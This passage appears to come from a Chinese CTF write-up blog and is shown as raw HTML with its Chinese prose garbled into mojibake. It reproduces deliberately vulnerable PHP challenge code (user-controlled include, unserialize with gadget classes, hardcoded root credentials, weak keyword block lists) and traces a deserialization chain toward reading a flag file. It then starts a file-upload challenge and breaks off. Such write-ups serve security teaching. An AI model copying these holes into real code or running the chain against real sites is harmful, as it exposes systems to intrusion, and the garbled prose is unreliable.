class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//lib.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$parm</span></span>)</span>&#123;<br>    <span class="hljs-variable">$array</span>= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$parm</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;id=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;id)&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;id;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ çš„IDæ˜¯&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ å¥½ï¼&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;id;<br>        &#125;<br>    &#125;<br>&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Info</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getNewinfo</span>());<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$Info</span>-&gt;age;<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$Info</span>-&gt;nickname;<br>        <span class="hljs-variable">$updateAction</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-variable">$Info</span>,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>(<span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span>)));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;nickname);<span class="hljs-comment">//å±</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$CtrlCase</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname=<span class="hljs-variable">$nickname</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$argument</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$argument</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br>Class UpdateHelper&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$newinfo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$newInfo</span>,<span class="hljs-variable">$sql</span></span>)</span>&#123;<br>        <span class="hljs-variable">$newInfo</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$newInfo</span>);<br>        <span class="hljs-variable">$upDate</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sql;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hostname</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbuser</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbpass</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mysqli=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;hostname, <span class="hljs-variable">$this</span>-&gt;dbuser, <span class="hljs-variable">$this</span>-&gt;dbpass, <span class="hljs-variable">$this</span>-&gt;database);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error);<br>        &#125;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$idResult</span>, <span class="hljs-variable">$passwordResult</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$idResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;password)!==<span class="hljs-variable">$passwordResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//login.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt; <br>&lt;title&gt;login&lt;/title&gt;<br>&lt;center&gt;<br>&lt;form action=<span class="hljs-string">&quot;login.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> style=<span class="hljs-string">&quot;margin-top: 300&quot;</span>&gt;<br>&lt;h2&gt;ç™¾ä¸‡å‰ç«¯çš„ç”¨æˆ·ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ&lt;/h2&gt;<br>&lt;h3&gt;åŠæˆå“ç³»ç»Ÿ ç•™åé—¨çš„ç¨‹åºå‘˜å·²ç»è·‘è·¯&lt;/h3&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> placeholder=<span class="hljs-string">&quot;UserName&quot;</span> required&gt;<br>&lt;br&gt;<br>&lt;input type=<span class="hljs-string">&quot;password&quot;</span> style=<span class="hljs-string">&quot;margin-top: 20&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> placeholder=<span class="hljs-string">&quot;password&quot;</span> required&gt;<br>&lt;br&gt;<br>&lt;button style=<span class="hljs-string">&quot;margin-top:20;&quot;</span> type=<span class="hljs-string">&quot;submit&quot;</span>&gt;ç™»å½•&lt;/button&gt;<br>&lt;br&gt;<br>&lt;img src=<span class="hljs-string">&#x27;img/1.jpg&#x27;</span>&gt;å¤§å®¶è®°å¾—åšå¥½é˜²æŠ¤&lt;/img&gt;<br>&lt;br&gt;<br>&lt;br&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$user</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br&gt;Damn you, hacker!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Damn you, hacker!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/form&gt;<br>&lt;/center&gt;<br><span class="hljs-comment">//update.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;</span><br><span class="hljs-string">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="hljs-string">&lt;title&gt;update&lt;/title&gt;</span><br><span class="hljs-string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span><br><span class="hljs-string">&lt;/html&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]!=<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;<br>&#125;<br><span class="hljs-variable">$users</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$users</span>-&gt;<span class="hljs-title function_ invoke__">update</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]===<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>çœ‹ç€åƒ<code>pop</code>é“¾ï¼Ÿæˆ‘ä»¬ä»<code>update.php</code>è¿™ä¸ªå…¥å£å¼€å§‹çœ‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><span class="hljs-variable">$users</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$users</span>-&gt;<span class="hljs-title function_ invoke__">update</span>();<br></code></pre></td></tr></table></figure><p><code>new</code>äº†ä¸€ä¸ª<code>User</code>ï¼Œè·Ÿè¸ªåˆ°<code>update()</code>æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Info</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getNewinfo</span>());<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$Info</span>-&gt;age;<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$Info</span>-&gt;nickname;<br>        <span class="hljs-variable">$updateAction</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-variable">$Info</span>,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ï¼Œå…ˆæ‰¾<code>destruct</code>ææ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;nickname);<span class="hljs-comment">//å±</span><br>   &#125;<br></code></pre></td></tr></table></figure><p>åé¢å¯èƒ½è¦ç”¨åˆ°è¿™ä¸ª<code>file_get_contents</code>è¿›è¡Œæ–‡ä»¶è¯»å–</p><p>ç»§ç»­è·Ÿè¸ªåˆ°<code>getNewinfo</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>POST</code>ä¼ å‚<code>age</code>å’Œ<code>nickname</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>(<span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span>)));<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¸ªåˆ°<code>info</code>ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$CtrlCase</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname=<span class="hljs-variable">$nickname</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$argument</span></span>)</span>&#123; <span class="hljs-comment">//è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è§¦å‘</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$argument</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>safe</code>æ–¹æ³•ï¼š(æ³¨æ„è¿™é‡Œè¿›è¡Œäº†å­—ç¬¦ä¸²æ›¿æ¢)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$parm</span></span>)</span>&#123;<br>    <span class="hljs-variable">$array</span>= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$parm</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»ˆç‚¹æ˜¯<code>unserialize($this-&gt;getNewinfo())</code>ï¼Œåˆ©ç”¨ææ„å‡½æ•°<code>file_get_contents($this-&gt;nickname)</code>å»è¯»<code>flag.php</code>ï¼Œä½†<code>safe</code>è¿™ä¸ªå‡½æ•°ç›´æ¥æŠŠ<code>flag</code>ç»™æ›¿æ¢æˆ<code>hacker</code>ã€‚</p><p>å—çš„è¿™é‡Œæƒ³äº†åŠå¤©ä¸çŸ¥é“æ€ä¹ˆæã€‚ã€‚çœ‹äº†å…¶å®ƒå¸ˆå‚…åšå®¢æ‰çŸ¥é“æ€è·¯é”™äº†ã€‚ã€‚</p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p><code>index.php</code>ç•Œé¢å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_char</span> <span class="hljs-keyword">as</span> <span 